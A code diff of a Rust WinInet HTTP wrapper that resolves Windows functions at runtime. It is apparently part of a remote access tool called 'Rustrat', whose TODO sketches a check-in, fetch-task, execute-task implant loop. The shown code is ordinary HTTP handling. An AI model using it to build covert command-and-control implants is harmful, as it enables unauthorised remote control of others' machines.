@@ -1,8 +1,6 @@
 // TODO: Initial state -> generate public key -> checkin -> regenerate public key if failed, otherwise continue -> fetch task -> execute task
-// TODO wrappers, open HINTERNET handles when creating structs, calling InternetCloseHandle on destruction
-// TODO remember error handling, functions may fail to connect
 
-mod error;
+pub mod error;
 
 use crate::ffi::{FfiType, FnTable, GetLastError, Win32FfiTypes};
 
@@ -11,13 +9,13 @@ use std::ffi::CString;
 use std::os::raw::c_void;
 use std::ptr;
 
-struct InternetHandle<'a> {
-    // TODO Arc<RwLock<FnTable>> instead of 'a?
+pub struct InternetHandle<'a> {
+    // TODO Arc<RwLock<FnTable>>?
     fn_table: &'a FnTable,
     handle: *mut c_void,
 }
 
-struct InternetUrlHandle<'a> {
+pub struct InternetUrlHandle<'a> {
     fn_table: &'a FnTable,
     handle: *mut c_void,
     // TODO is this neccessary? I believe we want to close the handle to this before InternetHandle's
@@ -25,7 +23,7 @@ struct InternetUrlHandle<'a> {
 }
 
 bitflags! {
-    struct InternetUrlFlags: u32 {
+    pub struct InternetUrlFlags: u32 {
         const INTERNET_FLAG_HYPERLINK = 0x400;
         const INTERNET_FLAG_IGNORE_CERT_CN_INVALID = 0x1000;
         const INTERNET_FLAG_IGNORE_CERT_DATE_INVALID = 0x2000;
@@ -109,17 +107,61 @@ impl<'a> InternetHandle<'a> {
 }
 
 impl<'a> InternetUrlHandle<'a> {
-    // TODO function read headers
+    pub fn get_response_headers(&self) -> error::Result<Vec<u8>> {
+        let chunk_size = 0xffff;
+        let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
+        // Note that HttpQueryInfoA writes bytes written to capacity.
+        let mut capacity: u32 = out.capacity() as u32;
+        let mut lpdwindex: u32 = 0;
+        let mut is_successful: i32 = 0;
 
-    pub fn get_response(&mut self) -> error::Result<Vec<u8>> {
+        // Now this looks quite ugly, is_successful is perhaps a bad variable name as it is used here (as a i32).
+        // Also, the structure is possibly not best for readability, but I could not think of a more pretty way to do it when I wrote this function.
+        unsafe {
+            while is_successful == 0 {
+                is_successful = self.fn_table.call_fn(
+                    "HttpQueryInfoA".to_string(),
+                    &[
+                        arg(&self.handle),
+                        arg(&22u32), // HTTP_QUERY_RAW_HEADERS_CRLF
+                        arg(&out.as_mut_ptr()),
+                        arg(&(&mut capacity as *mut _ as *mut c_void)),
+                        arg(&(&mut lpdwindex as *mut _ as *mut c_void)),
+                    ],
+                )?;
+
+                if is_successful == 0 {
+                    let error_code = GetLastError();
+                    if error_code != 122 {
+                        // 122 = ERROR_INSUFFICIENT_BUFFER
+                        return Err(error::Error::WinApiError(GetLastError()));
+                    }
+
+                    out.reserve(out.capacity() + chunk_size);
+                    capacity = out.capacity() as u32;
+                    lpdwindex = 0;
+                }
+            }
+
+            // Remember that HttpQueryInfoA writes bytes written to capacity.
+            out.set_len(capacity as usize);
+        }
+
+        out.shrink_to_fit();
+        Ok(out)
+    }
+
+    // After the response has been read, it is not possible to read it again, so this function takes ownership of the struct.
+    // The result could be "cached", but I won't do it unless it is required.
+    pub fn get_response(self) -> error::Result<Vec<u8>> {
         let chunk_size = 0xffff;
         let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
         let mut total_bytes_written: u32 = 0;
         let mut bytes_written: u32 = 0;
 
         unsafe {
-            //is_error is a boolean, 0 = false
-            let mut is_error: i32 = self.fn_table.call_fn(
+            //is_successful is a boolean, 0 = false
+            let mut is_successful: i32 = self.fn_table.call_fn(
                 "InternetReadFile".to_string(),
                 &[
                     arg(&self.handle),
@@ -129,29 +171,32 @@ impl<'a> InternetUrlHandle<'a> {
                 ],
             )?;
 
-            while is_error != 0 && bytes_written != 0 {
+            while is_successful != 0 && bytes_written != 0 {
                 total_bytes_written += bytes_written;
                 bytes_written = 0;
 
                 out.set_len(total_bytes_written as usize);
                 out.reserve(chunk_size);
 
-                is_error = self.fn_table.call_fn(
+                // TODO use spare_capacity_mut when stable https://doc.rust-lang.org/std/vec/struct.Vec.html#method.spare_capacity_mut
+                is_successful = self.fn_table.call_fn(
                     "InternetReadFile".to_string(),
                     &[
                         arg(&self.handle),
-                        arg(&(&out[total_bytes_written as usize..].as_mut_ptr())),
+                        arg(&out.as_mut_ptr().add(total_bytes_written as usize)),
                         arg(&(out.capacity() as u32 - total_bytes_written)),
                         arg(&(&mut bytes_written as *mut u32)),
                     ],
                 )?;
             }
 
-            if is_error == 0 {
+            // TODO Documentation mentions ERROR_INSUFFICIENT_BUFFER, but I have been unable to encounter that so far. Does it need to be handled?
+            if is_successful == 0 {
                 return Err(error::Error::WinApiError(GetLastError()));
             }
         }
 
+        out.shrink_to_fit();
         Ok(out)
     }
 }
@@ -176,7 +221,7 @@ impl<'a> Drop for InternetUrlHandle<'a> {
     }
 }
 
-fn register_wininet_fns(fn_table: &mut FnTable) -> error::Result<()> {
+pub fn register_wininet_fns(fn_table: &mut FnTable) -> error::Result<()> {
     fn_table.register_fn(
         "InternetOpenA".to_string(),
         "Wininet.dll".to_string(),
@@ -217,6 +262,19 @@ fn register_wininet_fns(fn_table: &mut FnTable) -> error::Result<()> {
     )?;
 
     fn_table.register_fn(
+        "HttpQueryInfoA".to_string(),
+        "Wininet.dll".to_string(),
+        FfiType::UINT32 as i32,
+        &[
+            FfiType::POINTER as i32,
+            FfiType::UINT32 as i32,
+            FfiType::POINTER as i32,
+            FfiType::POINTER as i32,
+            FfiType::POINTER as i32,
+        ],
+    )?;
+
+    fn_table.register_fn(
         "InternetCloseHandle".to_string(),
         "Wininet.dll".to_string(),
         FfiType::UINT32 as i32,
@@ -224,26 +282,4 @@ fn register_wininet_fns(fn_table: &mut FnTable) -> error::Result<()> {
     )?;
 
     Ok(())
-}
-
-pub fn do_http_get(url: String) -> error::Result<Vec<u8>> {
-    let mut fn_table = FnTable::new();
-    register_wininet_fns(&mut fn_table)?;
-
-    let ua = CString::new("Rustrat").unwrap();
-    let url = CString::new(url).unwrap();
-
-    let internet_handle = InternetHandle::create(&fn_table, ua).unwrap();
-    let mut url_handle = internet_handle
-        .create_url_handle(
-            url,
-            None,
-            InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
-                | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
-                | InternetUrlFlags::INTERNET_FLAG_PRAGMA_NOCACHE
-                | InternetUrlFlags::INTERNET_FLAG_RELOAD,
-        )
-        .unwrap();
-
-    Ok(url_handle.get_response().unwrap())
 }
